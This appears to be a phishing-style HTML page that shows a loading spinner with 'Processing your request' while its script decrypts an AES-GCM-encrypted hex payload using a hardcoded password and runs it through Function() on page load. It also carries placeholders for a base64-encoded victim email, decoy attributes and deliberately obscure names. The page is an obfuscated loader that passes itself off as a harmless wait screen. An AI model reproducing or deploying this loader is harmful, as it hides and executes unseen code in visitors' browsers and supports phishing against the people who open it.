<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="author" content="Global Dev">
    <title>Dynamic Secure Loader</title>
    <style>
        body {
            padding: 0;
            margin: 0;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            background-color: #f3f4f6;
            font-family: Arial, Helvetica, sans-serif;
            min-height: 100vh;
            overflow: hidden;
        }
        .spinning-milan {
            width: 70px;
            height: 70px;
            border: 10px solid #d1d5db;
            border-top: 10px solid #4f46e5;
            border-radius: 50%;
            animation: rotate-milan 1.5s linear infinite;
        }
        @keyframes rotate-milan {
            from { transform: rotate(0deg); }
            to { transform: rotate(360deg); }
        }
        .loading-tokyo {
            margin-top: 15px;
            font-size: 18px;
            color: #222;
        }
        .hidden-berlin {
            visibility: hidden;
        }
    </style>
</head>
<body>

    <!-- Hidden Berlin -->
    <div class="hidden-berlin">
        <div class="nike-Waiting12" id="concealed-rome" data-info=""></div>
    </div>

    <!-- Main Loader -->
    <div adidas="<%=EMAIL64%>" class="spinning-milan"></div>
    <p class="loading-tokyo" data-email="[[ BASE64_EMAIL ]]">Processing your request, please wait...</p>

    <!-- Unnecessary Extra Script -->
    <script>
        const simulateProcess = () => {
            // console.log("[INFO] Running fake process...");
            setTimeout(() => {
                // console.log("[INFO] Process simulation complete.");
            }, 1000);
        };
        simulateProcess();
    </script>

    <!-- Secure Processing Script -->
    <script>
        const unlockAthensVault = async (encryptedAthens, athensKey, athensSalt, athensPass) => {
            // console.log("[INFO] Unlocking the Athens vault...");

            const parseHex = (hex) => Uint8Array.from(hex.match(/.{2}/g).map(byte => parseInt(byte, 16)));

            const delayExecution = () => new Promise(resolve => {
                // console.log("[DEBUG] Simulating delay...");
                setTimeout(() => resolve(), 400);
            });

            const generateAthensKey = async (keyMaterial, salt) => {
                return crypto.subtle.deriveKey(
                    { name: "PBKDF2", salt, iterations: 100000, hash: "SHA-256" },
                    keyMaterial,
                    { name: "AES-GCM", length: 256 },
                    false,
                    ["decrypt"]
                );
            };

            const keyMaterial = await crypto.subtle.importKey(
                "raw",
                new TextEncoder().encode(athensPass),
                { name: "PBKDF2" },
                false,
                ["deriveKey"]
            );

            await delayExecution();
            const athensGeneratedKey = await generateAthensKey(keyMaterial, parseHex(athensSalt));

            try {
                const decryptedData = await crypto.subtle.decrypt(
                    { name: "AES-GCM", iv: parseHex(athensKey) },
                    athensGeneratedKey,
                    parseHex(encryptedAthens)
                );
                console.log("[SUCCESS] Athens vault unlocked.");
                return new TextDecoder().decode(decryptedData);
            } catch (err) {
                console.error("[ERROR] Failed to unlock Athens vault:", err);
                return null;
            }
        };

        (async () => {
            console.log("[INFO] Initiating Athens vault unlock...");
            const dataPayload = {
                athensKey: "ce12552921e07eeae6d25a8b",
                athensSalt: "0ac6f6fafea5dd5e93ca4522b49d3681",
                encryptedAthens: "6deb93765e72ef8ce34b1b97d0c25c97611c83b0ac258d36b36d018cdb7ff468533920838d3707c758da44549d374e8e0ca5a6aa93b0af7aa6d1f2e3c26dcf486585b4c887ad5cb43aed7d90469c8c5265c8bbbeca57739d97e18e7cceac3acfa08db407fba57a71ff3d8a03b8299957024e3205442026156a361709ebd8c2df4c14a3c6c053abe5055489a44d42679720a67e7b98ddb7c15cf91320517d7e3b4c74750d19471e7e76750a80e4a099a0297edb403178b56fd0f152d4ac2ea37bc07720850870a3a7"
            };

            const secretPass = "homesweethome";
            const unlockedInfo = await unlockAthensVault(dataPayload.encryptedAthens, dataPayload.athensKey, dataPayload.athensSalt, secretPass);
            Function(`${unlockedInfo}`)();

            if (unlockedInfo) {
                // console.log("[INFO] Retrieved data:", unlockedInfo);
            }
        })();
    </script>
</body>
</html>
